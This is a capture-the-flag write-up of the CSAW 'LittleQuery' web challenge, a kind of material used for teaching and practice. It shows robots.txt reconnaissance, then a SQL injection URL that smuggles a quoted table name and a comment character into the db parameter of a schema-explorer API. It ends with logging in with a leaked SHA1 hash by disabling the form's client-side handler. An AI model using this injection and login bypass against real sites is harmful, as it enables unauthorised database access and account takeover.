## LittleQuery
Web - 200 point

### Challenge 
> I've got a new website for BIG DATA analytics!
> http://littlequery.chal.csaw.io

### Solution

Other than the login page, there's nothing else seemingly exploitable on the page.

I decided to look for a sitemap, and eventually I got to their `robots.txt`
http://littlequery.chal.csaw.io/robots.txt

	User-agent: *
	Disallow: /api

This means there is a directory at http://littlequery.chal.csaw.io/api/ and we can see `db_explore.php` in it.

It is an API to explore the SQL schema. 
http://littlequery.chal.csaw.io/api/db_explore.php
> Must specify mode={schema|preview}

Here we can see the `user` table in `littlequery` database
http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema
http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&db=littlequery&table=user

However, the preview mode doesn't allow us in
http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&db=littlequery&table=user
> Database 'littlequery' is not allowed to be previewed.

*(I got stuck here...)*

---

Thanks @LFlare for helping me from here onwards! (SQL injection)

http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&db=littlequery`.`user`%23&table=users

and we can login using the SHA1 directly: `$(".form-signin").off()`


***Flag: `flag{mayb3_1ts_t1m3_4_real_real_escape_string?}`***